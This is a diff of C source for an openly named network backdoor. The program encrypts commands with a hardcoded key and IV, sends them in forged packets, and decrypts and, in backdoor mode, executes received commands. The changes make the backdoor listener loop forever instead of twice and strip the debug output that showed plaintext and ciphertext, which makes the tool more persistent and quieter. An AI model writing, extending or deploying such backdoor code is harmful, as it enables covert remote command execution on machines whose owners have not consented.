@@ -106,16 +106,15 @@ int main(int argc, char **argv)
                 cypher_len = forgepacket(ciphertext, command, BUFF_SIZE);
                 client(source_host, dest_host, dest_port, ciphertext, cypher_len);
 
-                fprintf(stdout, "Listen from Backdoor..\n");
+                fprintf(stdout, "\nListen from Backdoor..\n\n");
                 server(dest_host, source_host, dest_port, false);
             }
         }
     }
     else
     {
-        for (int i = 0; i < 2; i++)
+        while (1)
         {
-            fprintf(stdout, "Backdoor Open..\n");
             server(source_host, dest_host, dest_port, true);
         }
     }
@@ -145,9 +144,6 @@ int forgepacket(unsigned char *ciphertext, char *buff, int size)
 {
     // ENCRYPT DATA
     int ciphertext_len = encrypt((unsigned char *)buff, size, (unsigned char *)KEY, (unsigned char *)IV, (unsigned char *)ciphertext);
-    fprintf(stdout, "Normal Text:\n%s\n\n", buff);
-    fprintf(stdout, "Cypher Text:\n%d\n%s\n\n", ciphertext_len, ciphertext);
-
     return ciphertext_len;
 }
 
@@ -295,6 +291,7 @@ void server(unsigned int source_addr, unsigned int dest_addr, unsigned short des
     int pc = 0;
     int packet_count = 0;
 
+    fprintf(stdout, "Backdoor Open..\n");
     while (open) /* read packet loop */
     {
         /* Open socket for reading */
@@ -336,7 +333,7 @@ void server(unsigned int source_addr, unsigned int dest_addr, unsigned short des
                     char *decryptedtext = (char *)malloc(size);
                     decrypt((unsigned char *)commandBuffer, size, (unsigned char *)KEY, (unsigned char *)IV, (unsigned char *)decryptedtext);
 
-                    fprintf(stdout, "Decypher: %s\n\n", decryptedtext);
+                    fprintf(stdout, "Decypher: \n%s\n\n", decryptedtext);
 
                     // if Backdoor EXECUTE command
                     if (isBackdoor)
